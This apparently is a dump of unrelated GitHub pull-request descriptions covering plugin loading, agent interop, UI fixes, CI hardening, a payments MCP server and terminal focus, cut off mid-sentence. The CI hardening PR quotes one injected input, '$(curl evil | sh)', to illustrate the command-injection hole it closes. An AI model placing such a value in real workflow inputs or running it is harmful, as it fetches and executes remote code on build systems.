body:
## Summary

Allow plugin manifests to declare `skills` as either a single path string or an array of path strings in the core plugin loader.

## Why

Some plugin packages need to expose skills from more than one directory. Before this change, `plugin.json` only accepted a single string for `skills`, so manifests like this were ignored as an invalid `skills` shape:

```json
{
  "skills": ["./skills/abc", "./skills/edk"]
}
```

This keeps the existing single-string form working while adding support for the list form. The final scope is intentionally limited to the core plugin manifest/load path for `skills`; `apps`, file-backed `mcpServers`, and the bundled plugin-creator assets are unchanged in this PR.

## What changed

- Parse `skills` as either a string or an array of strings in `plugin.json`.
- Store resolved skill paths as a list in `PluginManifestPaths`.
- Load manifest-declared skill roots in addition to the default `./skills` root.
- Deduplicate exact duplicate skill roots before loading.
- Rely on existing skill-loader dedupe by canonical `SKILL.md` path for overlapping roots such as `./skills` plus `./skills/abc`.
- Update plugin manifest tests to cover:
  - single string `skills`
  - list of string `skills`
  - duplicate skill roots
  - `./skills` as a manifest path
  - explicit child roots like `./skills/abc` and `./skills/edk`
  - overlapping-root dedupe

## Summary

Implements **Phase I — A2A (Agent2Agent) interoperability**, the last pending phase of the `specs/` roadmap. Bidirectional A2A interop in a new `prismal/a2a/` subpackage — **opt-in** (`settings.a2a_enabled`, default off ⇒ supervisor graph unchanged), HTTP/SSE deps under the `[a2a]` extra. Spec: [`specs/a2a-interop/`](./specs/a2a-interop/).

A2A is the *agent*-level complement to MCP (*tools*): `prismal/mcp/` stays for tools, `prismal/a2a/` adds agents. Everything that crosses the A2A trust boundary is **L1-sanitized + audited** before it touches `AgentState`.

## What's included

| Module | Content |
|---|---|
| `types.py` | A2A v0.3.x Pydantic models (camelCase wire aliases; `A2AAuth` secrets as `SecretStr`) |
| `card.py` | `build_agent_card` — registry + `a2a_published_skills` allowlist, `did:web`, multimodal output modes, per-(settings, org) cache |
| `server.py` | **inbound** `A2AServerHandler` — JSON-RPC `message/send`·`tasks/get`·`tasks/cancel` + SSE `stream_rpc`; sanitized graph mapping (`thread_id=task_id`); `AuthContext` strict gate; `a2a.inbound` audit |
| `client.py` | **outbound** `A2AClient` (discover/send/cancel, bearer + OAuth2 auth), `A2AConnectionManager` (fnmatch allowlist + pool), `A2AAgentNode.as_node` (`@prismal_node`; graceful `metadata.a2a.error`) |
| `provider.py` | `A2AToolProvider` conforms to the Phase Y `ToolProviderPort` (remote skills as `a2a__{agent}__{skill}` tools) |

Plus: `a2a_*` settings + validators, `A2AError`/`A2AAgentUnavailable`, and `build_runtime(graph=, a2a_agents=)` wiring → `RuntimeContext.a2a_handler`.

## Verification

- **TDD** (red→green) throughout — 78 A2A tests, **94% branch coverage** (target ≥85%)
- **ruff** clean · **mypy --strict** clean · **bandit** 0 issues · **pre-commit** all hooks pass
- Full unit suite: **3623 passed, 9 skipped** under `pytest -n auto`
- Examples `examples/a2a_server.py` + `examples/a2a_remote_node.py` verified runnable

## Docs / metadata

author: yamilestebanh-collab
body:
## 1. Login offline — viabilidad
La sesión guardada **ya se restaura sin red** al abrir la app: `_layout` llama `rehydrateAuth()` (network-free) si hay token → `isAuthenticated` → tabs. La pantalla de login **solo** aparece cuando NO hay sesión local reutilizable (primer login o tras logout), así que un botón "entrar offline" ahí no tendría nada que reusar. **No se permite login nuevo offline** (regla respetada). 

Mejora segura (sin tocar seguridad):
- `authOffline.isRestorableSession` centraliza la regla de sesión válida (employeeId+warehouseId); `rehydrateAuth` la usa (refactor **idéntico** en comportamiento, ahora testeable).
- `login.tsx`: aviso offline honesto (`describeLoginOfflineNotice`) — para iniciar sesión por primera vez necesitas internet; si ya entraste antes, tu sesión se restaura sola al reabrir la app.

## 2. Refill en Sync
`prospection` es un tipo **compartido** (nuevo cliente / descarga / post-visita), así que no se puede relabelar el tipo. Se distingue el refill por su payload (`model: 'van.refill.request'`) y se muestra **"Solicitud de carga"**. **Sin tocar dispatcher ni payload.**

## Tests
`tests/authOffline.test.ts` (sesión restaurable / sin sesión / incompleta + aviso offline) y casos de etiqueta refill en `tests/secondaryFlowCopy.test.ts` (otros prospection no se confunden). **typecheck ✅ · tests ✅ 128/128.**

## Riesgos
- Cambio en `useAuthStore.rehydrateAuth` es un refactor idéntico (misma regla employeeId+warehouseId, mismo clear+return false); verificado por test y typecheck.
- El aviso offline usa NetInfo en el login (mismo mecanismo que ya usa `login()`). No cambia el flujo de autenticación.
- Sin backend, sin contratos API, sin relajar seguridad (no hay login nuevo offline).

body: ## Summary - Re-arm PR supervision when an `UpdateOnly` repair completes on a workspace that already has an open publication PR. - Preserve the existing PR identity instead of clearing it, while updating supervision state to `paused` or `monitoring` based on the workspace's publication settings. - Expand the repair completion regression to cover an existing PR with auto-merge/autofix state. ## User Impact Completed repair flows no longer leave the publication sidebar stuck in a stale `fixing` state after the repair is verified. When auto-merge is already in play, the existing PR can continue to surface as monitored instead of being dropped from the publication state. ## Technical Context - Added `update_only_repair_pr_supervision_state(...)` in `src-tauri/src/http_server/handlers/agent_workspaces.rs` to derive the post-repair supervision state for `UpdateOnly` repairs. - `complete_agent_workspace_repair` now calls `update_pr_auto_merge_state(...)` for the `UpdateOnly` path when the workspace has an open publication PR and the derived supervision state applies. - The new helper returns: - `paused` when auto-publish is disabled. - `monitoring` when autofix or auto-merge is enabled or already active. - Updated `src-tauri/tests/agent_workspace_repair_auto_publish.rs` to assert that update-only repair preserves the PR number and URL and transitions the workspace to the expected supervision state. ## Risks / Follow-Ups - This only changes the `UpdateOnly` repair path for workspaces that already have an open publication PR. - Workspaces with merged or closed publication PRs are left unchanged by the new helper. - The derived supervision state depends on the existing publication flags, so any mismatch in those flags will still affect the sidebar state that follows repair completion. --- Need help on this PR? author: rmssantos
body:
## Bug
On the **roadmaps** (and **labs**) page, the "Privacy settings" control injected by `analytics.js` rendered **unstyled in the page flow** (small button stuck in the bottom-left), instead of the intended fixed bottom-right pill + dialog.

## Cause
`analytics.js` injects the Privacy settings button/dialog (`.analytics-privacy-*`), which are styled by `assets/css/analytics-privacy.css`. `roadmaps.html` and `labs.html` loaded the **script but not the stylesheet** (every other page that loads `analytics.js` — home, exam, editor, the SEO `/exams/` pages — also loads the sheet). The control only appears on the public host (`isPublicSiteHost`), so it was invisible on localhost.

## Fix
- Add `<link rel="stylesheet" href="assets/css/analytics-privacy.css">` to `roadmaps.html` and `labs.html`.
- Bump `CACHE_VERSION` -> `v6.2`.
- Add `tests/test_analytics_privacy_wiring.py`: every page that loads `analytics.js` must also load `analytics-privacy.css` (guards against this regression on any future page).

## Verification
- `python -m pytest` — **290 passed**; `ruff check .` clean.
- Playwright: on both `roadmaps.html` and `labs.html` an injected `.analytics-privacy-button` now computes to `position: fixed; right: 12px; bottom: 10px; border-radius: 999px` (the styled pill), vs `static` before.

<!-- This is an auto-generated comment: release notes by coderabbit.ai -->

- Fixed styling of the Privacy settings control on roadmaps and labs pages by adding the missing `analytics-privacy.css` stylesheet link to both HTML files; the control now displays as a fixed pill in the bottom-right with correct styling instead of rendering unstyled in the page flow
- Incremented service worker cache version from v6.1 to v6.2 to invalidate cached assets
- Added regression test (`tests/test_analytics_privacy_wiring.py`) that verifies every page loading `analytics.js` also includes `analytics-privacy.css`, preventing this issue from recurring

author: jeffreycrum
body:
## Summary

Two fixes to the headless collab driver (`benchmarks/abeval`, workspace-excluded) that take a task from `PlanLocked`-stall to a **complete end-to-end Claude+Codex collab run reaching `CodingComplete`/`merged`**. Both build on the 7 fixes merged in #129.

Validated by a live single-task run (`abeval-01-issue-95`, ironmem arm): full pipeline — planning (draft → Codex draft → canonical → Codex review → final → locked) → task_list bridge → implement → local review → **Codex global review** → final review → `CodingComplete`. Metrics: `outcome=merged, ci_green=true`, Claude 326k/135k tok, **Codex 470k/22.9k tok** (real Codex engagement; passes the zero-Codex INVALID guard), `fix_commits=1`.

## Layer 8 — recover the compose artifact ref from the persisted drawer (`d10a068`)
The synthesis/finalize compose workers `add_drawer(room="collab-drafts")` then print `ref: <id>`, but the model **intermittently omits the line** → `compose worker for canonical returned no ref: line` (the exact failure the prior live run died on). 

Fix: stop trusting stdout. `collab_db::newest_draft_drawer(after_rowid)` reads the freshest `collab-drafts` drawer by rowid from the per-task `collab.db`; the driver snapshots the max rowid before the compose turn and takes the newly-persisted drawer as authoritative, falling back to `parse_ref_line` for file-staged topics.

**Correction to the originally-planned fix:** reading `collab_sessions.canonical_plan_drawer_id` does *not* work — that column is set server-side only by the *submit* worker's `collab_send`, so it's null at compose time. The drawers table is the right source.

## Layer 9 — dedicated PlanLocked task_list bridge (`0ee92a4`)
PlanLocked was dispatched as a generic `ClaudeCompose` submitting via `collab-turn-submit.md`, which only handles canonical/final/final_review. `task_list`'s artifact is a **file** (writing-plans output) + content hash, not a drawer. New `WorkerAction::TaskListBridge` mirrors `collab.md`'s v3 bridge: compose → `plan_file_path`+hash+fidelity; fail-clean on `fidelity:fail`; else auto-proceed and submit the same template `$MODE=submit` with `$ARTIFACT_REF`+`$ARTIFACT_HASH`.

## Layer 10 — investigated, NOT needed
The push-before-Codex `branch_drift` hazard does not manifest in abeval: `provision_collab_env` already does `git push -u origin <branch>` at startup, so Codex's review fetch never errors. Confirmed by the run passing global review with no push step.

## Tests
All abeval test binaries green; fmt + clippy `-D warnings` clean. Added unit tests (drawer-ref precedence, task_list ref split, fidelity detection) and loop regressions (missing-ref recovery reaches CodingComplete; fidelity:fail aborts clean); updated the dispatch-matrix + happy-path tests.

## Note
Branch protection requires a review — please review/admin-merge. Only touches the workspace-excluded `benchmarks/abeval` crate.

author: marinhofeliphe
body:
https://liferay.atlassian.net/browse/LPD-94528

## What Is Being Fixed

AI Task workflows need to make outbound HTTP calls — to REST APIs and to
backend client extensions — and, per the permission model in LPD-90977,
to forward a proper user token (potentially bearing OAuth 2.0 scopes).
The HTTP Call Kaleo node is that primitive. This change builds out the
HTTP node backend on top of the node foundation introduced for the
Content Site Generator (LPD-88864).

## How It Is Being Fixed

The first two commits are the http-call node type and its executor from
the LPD-88864 work, used here as the base (the executor also parses the
HTTP method case-insensitively so a lowercase method does not throw).
The service node that rode along with that node-type foundation is then
removed, since it is delivered by LPD-88864. On top of that, the node
gains the capabilities the AI Task feature needs: granular JSON output
mapping, which extracts individual response fields into named workflow
context variables via an optional path rather than storing the whole
body in one variable; JSON escaping of input values interpolated into
the request body so a value containing quotes or control characters
cannot corrupt it; a configurable timeout applied to the outbound
request; preservation of value types when mapping output so numbers and
booleans are not coerced to strings; and a Node Failed SSE event so a
subscribed UI is notified when a call fails. The output-mapping logic is
extracted into VariablesUtil so it can be unit tested directly, which
also lets the executor drop its JSONFactory reference.

Tests cover the new logic: unit tests for VariablesUtil input/output
variable handling (substitution, escaping, field extraction, type
preservation) and an integration assertion that the timeout setting
persists on the node.

author: nkreiger
body:
## Summary

Clears all **54 open CodeQL code-scanning alerts** on the GitHub Actions definitions. This is **separate** from the Dependabot dependency work (PR #30) — these are CodeQL findings about how our `action.yaml` / workflow files are written, not npm deps.

| Rule | Count | Fix |
|---|---:|---|
| `actions/code-injection/medium` | 44 | Bind `inputs.*` / `steps.*.outputs.*` / `env.*` to step-level `env:` vars; reference as quoted shell vars instead of expanding `${{ }}` into `run:` blocks |
| `actions/unpinned-tag` | 7 | Pin externally-owned actions to commit SHAs |
| `actions/missing-workflow-permissions` | 3 | Add least-privilege `permissions: { contents: read }` |

## Details

**Command injection (the meaningful hardening):** an action input like `fianu_gate_name: "$(curl evil | sh)"` was being expanded straight into the shell before bash ran. Now every untrusted value flows through `env:` and is referenced as `"$VAR"`, which CodeQL recognizes as safe and which also blocks shell word-splitting. `GATE_OPTS` / `${opts}` are deliberately left **unquoted** to preserve the existing multi-flag option behavior. Dead commented-out `$GITHUB_STEP_SUMMARY` blocks that also carried flagged interpolations were removed.

**Pinning:** `google-github-actions/auth@v2`, `setup-gcloud@v2`, `sigstore/cosign-installer` (both `@v3.5.0` and the `@main` in `test-cli-root-init.yml`) are now pinned to commit SHAs with `# vX` comments. **First-party** `fianulabs/actions@main` and `capture-blob@main` are intentionally left floating to keep tracking latest (per decision — accepts those 2 alerts).

**`manifest_cyber` jq-action:** `sergeysova/jq-action@v2` was both a code-injection sink (untrusted `cmd:` input) and an unpinned tag. Replaced it with an inline `jq "$BOM_REF_PATH" "$SBOM_OUTPUT"` step using env vars. The `bom-ref-path` default was changed from `.metadata.component[\"bom-ref\"]` (escaped for the old shell `cmd:`) to a clean jq filter `.metadata.component["bom-ref"]`, now that it's passed as a quoted arg.

## Verification

- All six YAML files parse; `actionlint` clean on the workflows (the two findings it reports — duplicate `ubuntu-latest`, `macos-13` label — are pre-existing and unrelated).
- No `${{ }}` remains inside any `run:` block; remaining interpolations are all in `env:`, `with:`, `if:`, and output expressions.
- **No functional behavior change** intended.

> ⚠️ **Reviewer note:** `gate/`, `capture-blob/`, and `manifest_cyber/` are **not exercised by existing CI** (workflows only test the root `./` and `./agent` setup actions), so these edits rest on review rather than automated tests. The shell logic was preserved line-for-line aside from the variable substitution.

body:
An MCP server that lets an AI client (Claude Desktop/Code) or KarlPOS automation operate Samsoftpay through its API.

**Tools:** ping, whoami, get_charge, get_payout (read-only); create_charge, create_payout, **batch_payout**, refund_charge, create_payment_link (money-moving).

**Built for KarlPOS withdrawals + batch payouts**, and tested inside-out against a live local instance — **21/21 checks**:
- Money-moving tools **refuse a LIVE key** unless SAMSOFTPAY_ALLOW_LIVE=1 (AI can't touch real money by default)
- **Idempotency** on every money op; batch re-run returns the SAME payout ids -> **no double-pay** on retry
- **Overdraft protection**: payout beyond available balance rejected with a clear error
- **Batch isolation**: one bad item doesn't stop the others
- Full charge lifecycle (create -> succeeded), refund, payment link, 404/400 handling

Runs separately from the Flask app (own deps: mcp, httpx). Setup + Claude Desktop config in mcp_server/README.md.

author: millyinvr
body:
Removes the CA-only signup lock so pros can onboard in any of the 50 states + DC. This is the **onboarding** half of the multi-state launch: Phase 2 ([#218](https://github.com/MillyinVR/tovis-app/pull/218)) seeded the per-state *scope of practice*; this captures the pro's state and asks for the right credential for it.

## Foundation (fixes the 3× duplication too)
- **`lib/usStates.ts`** — canonical 50-states+DC list (code + name) + validators. One source for the signup selector and server-side validation.
- **`lib/licensing/licenseRequirement.ts`** — `getLicenseRequirement(profession, state) → LICENSED | REGISTERED | EXEMPT`, a baseline-per-profession + per-state-overrides table distilled from the same scope doc as `licenseScope.ts`. `requiresLicense()` and `supportsOnlineVerification()` **replace the three duplicated CA-only lists** (register API, compliance-summary API, signup client) — they now all share this module.

## Onboarding
- **register API**: state is now **mandatory for every pro** — it drives the per-state service gate (`loadAllowedServices` keys off `licenseState`), not just license checks. Whether a credential is required comes from `requiresLicense(profession, state)`. CA core BBC professions still auto-verify via **BreEZe**; everything else → **attestation + async admin review** (account usable while `PENDING`). Out-of-state licenses no longer `400`.
- **signup form**: always-shown **State selector**; the license/registration field appears **reactively** per `(profession, state)`; the **3 specialty professions** (lash tech, hair braider, permanent makeup artist) added to the dropdown; CA-only copy generalized.

## Verification method by case
| Profession + state | Credential | Verification |
|---|---|---|
| Cosmetologist / CA | License required | BreEZe online |
| Cosmetologist / NY | License required | Attestation + manual review |
| Lash tech / CA | None (within esthetician scope) | Certificate later |
| Lash tech / AZ | License required | Attestation + manual review |
| Makeup artist / any | None | Certificate later |

## Verification
`tsc` clean · **4071 unit tests green** (new `licenseRequirement` suite; updated register + signup-component tests for the mandatory-state flow). Signup flow **verified live in the browser**: Cosmetologist/CA → license + "verify automatically"; Lash tech/CA → exempt note; Lash tech/AZ → "Arizona license — Required" + manual-review note (screenshot in thread).

> ⚠️ **`licenseRequirement` is a v1 distillation pending legal review** — especially the braiding/PMU per-state lists (several states changed law in 2024–2026; the source doc flags some as "verify"). The table is data-only and easy to amend.
>
> Out-of-state verification is **attestation + async review** by design (chosen): pros are usable while an admin confirms the uploaded credential. Online auto-verifiers beyond CA BreEZe can be added per-state later.

author: emilyeserven
body:
## Summary

Adds drag-to-resize functionality for both the left sidebar and docked right panel, allowing users to customize their layout width within defined constraints. Widths are persisted to localStorage so preferences survive page reloads.

## Key changes

- **New `useResizeHandle` hook** (`packages/client/src/hooks/useResizeHandle.ts`): Encapsulates pointer-based drag logic with support for bidirectional resizing (left/right edges). Handles pointer capture, cursor feedback, and clamping to min/max bounds.
- **Sidebar resizing**: Added `SidebarResizeHandle` component to `AppSidebar` that uses the hook to resize the left sidebar (10–28 rem range). Integrated with the existing `--sidebar-width` CSS variable in `SidebarProvider`.
- **Right panel resizing**: Added resize handle to `RightPanel` when docked, allowing width adjustment (18–40 rem range).
- **UI store updates** (`packages/client/src/stores/uiStore.ts`):
  - Added `sidebarWidth` and `panelWidth` state with setter methods
  - Added `clampSidebarWidth` and `clampPanelWidth` utility functions to enforce range constraints
  - Persisted both widths to localStorage
- **CSS improvements** (`packages/client/src/index.css`): Disabled transitions during sidebar resize to prevent jank when dragging.
- **Root layout integration** (`packages/client/src/routes/__root.tsx`): Connected `sidebarWidth` from store to the `SidebarProvider` CSS variable.

## Implementation details

- Resize handles use the Pointer Events API with `setPointerCapture` to ensure smooth dragging even when the cursor leaves the element.
- Widths are measured in rem units and clamped on every change to maintain valid bounds.
- The sidebar resize handle is hidden when the sidebar is collapsed.
- Both resize handles provide visual feedback (cursor change, hover state) and disable text selection during drag.

author: cloudurbane
body:
The runner hardcoded a 6-file TESTS tuple, so six valid test files (test_auto_requeue_incomplete, test_concentration_backfill, test_fragrantica_description_year, test_reopen_incomplete, test_search_total_budget, and on feature branches test_year_resolver) silently never ran -- the list drifted from the actual test files.

Replace the tuple with auto-discovery of every test_*.py, and route each file by style: script-style files (with a __main__ guard) run as `python file.py` as before; pytest-style files (bare test_ functions, no __main__) run via `python -m pytest`. Running a pytest-style file as a plain script defines its functions and exits 0 without asserting anything -- a vacuous pass -- so routing them through pytest is required to actually exercise them.

Recovers 5 orphaned files on main (4 script + 14 pytest assertions in test_concentration_backfill). Suite goes 6/6 -> 12/12. test_run_tests.py locks down discovery + style routing against future drift.

author: iambilotta
body:
Implements the data-table layer (Epic #38) and the actions/notifications framework (Epic #39) in `lievit-kit`, following the kit's pure-Java builder + view-model architecture (no JPA, no SPA; the repository port stays the data seam, the view-model feeds the JTE template). TDD throughout; `./mvnw -pl lievit-kit -am verify` is green (134 unit/contract + 5 IT).

## Epic #38 — tables
- **Search**: `Column.searchable()` folds a column into a global search; the term rides the bounded `RecordRepository.Query`.
- **Sorting**: a multi-column `Sort` value object, clickable-header toggle, `Table.defaultSort`, per-header asc/desc indicators on `AdminListView`; `Column.sortKey()` is the stable name wired to the query (the flag-only `sortable` is now wired).
- **Pagination**: `Table.defaultPaginationPageOption` + `paginationPageOptions`, "all" → unbounded window, options surfaced on the view controls.
- **Filters**: `Filter` / `SelectFilter` (single+multi+relationship+searchable) / `TernaryFilter` / `TrashedFilter` over an immutable `FilterState`.
- **Display columns**: `IconColumn`, `ImageColumn`, `ColorColumn`, `TagsColumn` + `TextColumn` `formatStateUsing`/`money`/`limit`/`url`/`copyable`/`description`/`tooltip`.
- **Editable columns**: `ToggleColumn`, `TextInputColumn` (pure `EditableColumn` transform; the page persists).
- **Column toggling** (`toggleable` + `hiddenFrom`), **empty state**, **striping** on the view.

## Epic #39 — actions + notifications
- **Placement registry** `ActionRegistry`: header/row/bulk actions, dispatch by placement + name.
- **Bulk actions** `BulkAction` + `DeleteBulkAction`: selection → per-record authorize → chunked process → success/failure counts, deselect-after.
- **Action presentation** on `AdminAction`: icon/color/size/variant/tooltip/badge/outlined/disabled + per-record hidden predicate; built-in default colours.
- **Confirmation modal** (`ConfirmationModal`) + **modal actions** (`ModalConfig`) + **modal-with-form** (`FormAction`, validates via the existing `Form`+`FormValidator`).
- **Action groups** `ActionGroup` (dropdown, flat dispatch, hides when all children hidden).
- **ViewAction**, **ReplicateAction** built-ins.
- **Rich notifications**: `AdminNotification` title+body split, status→icon/iconColor defaults, `info` level, duration/seconds/persistent, position, serialized event shape.
- **Testing helpers** `ActionTester` (callAction / assertActionExists / assertActionHalted) off the wire.

## Core touched (minimal)
`LievitEffects.capturing()` — a public factory for an off-wire capturing effects sink, so server-side action-testing helpers can build a context and assert over the queued effects without booting the wire. Only exposes the already-public capture accessors.

## Deferred (not in this PR)
QueryBuilder constraint filter (#271), record reordering (#262), record grouping (#253), column summaries (#255), soft-delete/relationship/import/export actions (#331/#333/#335/#337), notification actions/DB bell/broadcast (#300/#302/#304). These are P1/P2 follow-ups that need either a richer aggregate query or a persistence/websocket store.

author: ncode
body:
## Summary

Applies the `structure-flat-string-facts` OpenSpec change: ADR-0011 (schema owns canonical fact spelling) extended to the remaining Ruby-era flat and delimiter-encoded facts. **Breaking output-shape change, before release — no compatibility aliases.**

| Fact | Before | After |
|------|--------|-------|
| kernel | `kernel`, `kernelrelease`, `kernelversion`, `kernelmajversion` (flat strings) | `kernel.{name, release.{full,major,minor,patch}, version.full}` map (patch conditional) |
| filesystems | comma-joined string | `[]string` array |
| path | raw `$PATH` string | `[]string` split on `os.PathListSeparator`, empty entries dropped |
| zfs | `zfs_featurenumbers`, `zfs_version` | `zfs.feature_numbers` (array), `zfs.version` (string) |
| zpool | `zpool_featurenumbers`, `zpool_featureflags`, `zpool_version` | `zpool.feature_numbers`/`feature_flags` (arrays), `zpool.version` (string; `5000` when feature flags present) |

## Implementation
- `internal/engine/os.go`: `kernelReleaseComponents` parses the leading numeric prefix (`^\d+(?:\.\d+)*`) into major/minor/patch (patch emitted only when a third component exists); `kernelFacts` builds the subtree; Windows path reworked to `currentWindowsKernel`. Filesystem probes return `[]string`.
- `internal/engine/core.go`: `pathEntries` splits PATH, drops empties.
- `internal/engine/session.go`: filesystems cache now `[]string`.
- `internal/engine/disks.go`: zfs/zpool emit dotted names with array values, `5000`/feature-flag logic preserved.
- Schema `docs/schema/facts.yaml` + regenerated `docs/supported-facts/`, `README`, `CHANGELOG`, supportedfacts example generator.

## CI / cross-platform (found by deep review, not by local darwin tests)
The per-platform **release-gate scripts** (`tools/{freebsd,openbsd,netbsd}-release-gate.sh`, `tools/windows-release-gate.ps1`) and the **integration smoke tests** (`.github/workflows/integration_tests.yaml`, `Makefile` lima targets) still asserted the removed flat names. All updated to the structured names (`kernel.name`, `kernel.release.full`, `kernel.release.major`, `kernel.version.full`). Without these the BSD/Windows/integration jobs would have failed immediately.

## Verification (local, darwin)
- `go build ./...` ✓ · `go vet ./...` ✓ · `go test ./...` ✓ (all packages)
- `openspec validate structure-flat-string-facts --strict` ✓
- Runtime: `kernel` is a structured map, `filesystems`/`path` are arrays, no old flat scalar names emitted.

## Cannot verify locally
Linux/Windows/FreeBSD/OpenBSD/NetBSD live discovery runs only in CI. The schema conformance gate marks `kernel.release.major`/`minor` non-conditional on all platforms — this relies on every real `uname -r` having a major.minor component (true for all real releases; patch is correctly conditional for BSD). CI is the real check on those paths.

author: yusukeharada
body:
## 追記内容

「通信設定だけでなくアプリも必要では？」という問いへの回答として、建設機械特有のSWアーキテクチャ課題を整理。

### セクション4.6: 必要なSW要素の全体像
通信設定①に加え、②制御ロジック・③HMI・④診断・⑤安全監視・⑥キャリブレーションが必要。自動車（閉じた系）と建設機械（外部アタッチメントが入る開いた系）の本質的違いを整理。

### セクション4.7: アーキテクチャパターン比較
- **パターンA**（ベース機械ECUに全SW）: 汎用アタッチメント向け、証跡一元化、新規追加コスト高
- **パターンB**（アタッチメント側インテリジェントECU）: 高機能アタッチメント向け、役割分担明確、I/F Spec合意が必須
- **パターンC**（Adaptive AUTOSAR動的デプロイ）: 将来、2030年以降

### セクション4.8: Classic AUTOSAR SWC設計指針

author: wpfleger96
body:
Under WARP VPN churn, an agent's active-timer badge sometimes never appeared for a turn that was genuinely in progress: the agent kept working and the turn eventually finished, but the badge was missing the whole time.

The active-agents badge is purely event-driven — `activeAgentTurnsStore` derives every turn from `turn_started` / `turn_completed` / `turn_liveness` observer frames. The relay client already does gap-recovery on reconnect: it replays each live `REQ` with a `since` window to backfill events missed during a drop. The agent-observer subscription opted out of that recovery by passing `limit: 0`, which the relay's historical path correctly truncates to zero rows (NIP-01: `limit 0` means "no historical results"). So on reconnect the observer `REQ` matched the gap window and was then truncated to nothing — a `turn_started` that fired mid-drop never re-delivered, and the badge never showed.

The cause is one-sided: the observer sub is the only reconnect-dependent subscription that opted out of replay. The fix mirrors the proven `subscribeToChannelLive` pattern — a replay-capable `limit: 1000` (which clamps cleanly at the DB's `max_limit.unwrap_or(1000)` cap), with `since: now` unchanged so launch-time history stays suppressed and only the reconnect replay window changes. Re-delivered frames are idempotent against the store's `(timestamp, seq)` watermark, so there is no double-count.

A regression-guard test asserts `subscribeToAgentObserverFrames` requests `limit: 1000`; store idempotency under replay is already covered by `activeAgentTurnsStore.test.mjs`.

body:
## Summary

- Automatically detects and silently installs WebView2 Runtime if missing — no manual intervention needed
- Verifies the bootstrapper's **Authenticode digital signature** (must be Valid and signed by Microsoft) before executing — used instead of a hardcoded SHA256 hash since the bootstrapper updates frequently but is always Microsoft-signed
- Removes the WebView2 manual install step from the troubleshooting table in `/intune/README.md`
- Adds WebView2 as step 3 in the Solution section of the README

## Why Authenticode instead of SHA256?

The WebView2 Evergreen Bootstrapper is a small downloader that Microsoft updates regularly. A hardcoded hash would break on every update. Authenticode signature verification checks the full certificate chain and confirms the binary is genuinely from Microsoft, regardless of version.

## Test plan

- [ ] Run script on a device without WebView2 — confirm it installs automatically
- [ ] Run script on a device with WebView2 already installed — confirm it skips silently
- [ ] Tamper test: confirm script aborts if signature check fails

## Summary

The uploaded `img-1985`–`img-1989` were 2000×923 files that turned out to be 16:9 photos padded with ~180px of white on the left and right edges — that's what was showing as the "white gaps down the sides".

author: punk6529
body:
## Issue
- Profile-native CMS publish needed a production-shaped decentralization path beyond DB-only publication.
- This stacks on the backend CMS package service and keeps the public primary lookup contract unchanged for `/profile-cms/{handle}/primary`.

## Fix
- Add EIP-712 publish intent verification, canonical decentralized storage receipt checks, pointer events, rollback/archive behavior, and package export data.
- Preserve CMS V1 schema/hash/canonicalization semantics; no protocol field changes.

## Changes
- Added CMS publish EIP-712 typed-data helpers for EOA recovery and Safe/EIP-1271 verification through the repo RPC provider.
- Added IPFS/Arweave storage receipt verifier requiring exactly one canonical decentralized receipt for production publish.
- Added `profile_cms_pointer_events` entity/repository/migration for publish, set-primary, supersede, rollback, and archive events.
- Added OpenAPI-backed endpoints for rollback, archive, and package export; regenerated API models/routes.
- Extended publish service behavior to enforce signature, deadline, signer/profile authorization, storage receipt validity, and pointer-event recording.
- Updated CMS package docs, architecture docs, and workstream memory with signing/storage/deployment assumptions.

## Validation
- `npm run generate:deploy-config`
- `cd src/api-serverless && npm run restructure-openapi`
- Regenerated API models/routes with the OpenAPI generator directly because the Windows shell cannot run the repo `npm run generate` script's Unix `rm` command.
- Focused Jest: `src/profile-cms/profile-cms-signing.test.ts`, `src/profile-cms/profile-cms-storage.test.ts`, `src/profile-cms/protocol/v1/profile-cms-protocol-v1.test.ts`, `src/api-serverless/src/profile-cms/profile-cms-api-service.test.ts`, `src/api-serverless/src/profile-cms/profile-cms-handlers.test.ts` — 5 suites, 39 tests passed.
- Targeted ESLint passed on touched CMS signing/storage/pointer/service/handler source and tests.
- `codex-diff-check --cached -- . ':(exclude)src/api-serverless/src/generated'` passed. Full generated-file whitespace check reports OpenAPI-generator boilerplate whitespace in newly generated models, so generated files were left as generated.

Typecheck caveat: root `tsc --noEmit` currently fails before a useful branch-specific signal because the local borrowed dependency tree resolves `openai` without declarations. API `tsc --noEmit` also reports base protocol typing and dependency-lib errors in this local dependency shape.

## Risk
- Level: Medium
- Why: publish authorization, storage receipt verification, and primary pointer movement are security-sensitive API/DB behavior.
- Rollback: revert this stacked PR; it is additive on top of the base CMS package tables/routes except for stricter publish request validation introduced here.

## Deployment
- Deploy `dbMigrationsLoop` first so `profile_cms_pointer_events` exists.
- Deploy `api` after the DB migration/entity sync so publish, rollback, archive, and export routes use the new table and generated models.

## Review Notes
- Please focus on EIP-712 replay fields, signer/profile authorization, EIP-1271 failure behavior, canonical receipt assumptions, pointer-event transaction ordering, and rollback concurrency guards.

author: austinywang
body: ## Summary - add regression coverage for the hidden/tiny first-responder focus handoff - schedule the existing automatic first-responder reconciliation when `GhosttyNSView.becomeFirstResponder()` suppresses focus because geometry is hidden or tiny - keep the retry on the existing coalesced focus-apply path so it reasserts Ghostty focus only after the pane is visible, active, key-window, and still the current focus target ## Root cause Code inspection confirmed a reachable AppKit-focused/Ghostty-unfocused divergence: `becomeFirstResponder()` sets the view-level `desiredFocus` before geometry gating, then the hidden/tiny branch logs and returns without calling `ghostty_surface_set_focus` or scheduling the normal focus reconciliation path. If AppKit makes the Ghostty view first responder during transient bonsplit/window portal layout churn, subsequent plain key input can route to the view while the runtime surface still has `desiredFocusState == false`. The branch dates to February 2026 (`5070b137a4`), so this looks like a latent race exposed by later timing changes rather than code introduced directly by the June refactors. The June candidates mostly changed surrounding timing: #6147 moved portal installation through window-chrome overlay resolution, #6278 moved terminal surface lifecycle into the macOS package and added restore/input-demand paths, and #6227/#6267 did not show a direct focus-state change in this path. ## Tests - Added deterministic DEBUG app-target coverage for first-responder while the inner Ghostty view is zero-sized, then geometry settling before the deferred apply drains. - Per issue instructions, I did not run local tests or local builds; CI is the validation path for this branch. Closes #6342 --- Need help on this PR? Tag /codesmith with what you need. Autofix is disabled. --- ## Summary by cubic Retries terminal focus after AppKit hands first responder to a hidden or tiny terminal, deferring apply until the portal and inner surface are usable. Forced reparent focus uses the same geometry guard and queues a retry on layout/visibility; dock retries only run when the dock owns first responder (fixes #6342). - **Bug Fixes** - Defer suppressed first-responder focus; reapply only when the window is key, pane and surface are visible, portal >1x1, and (for suppressed handoffs) inner surface >1x1. Automatic apply and Find-restore keep this deferral. - Gate forced reparent reassert by geometry; if hidden/tiny, 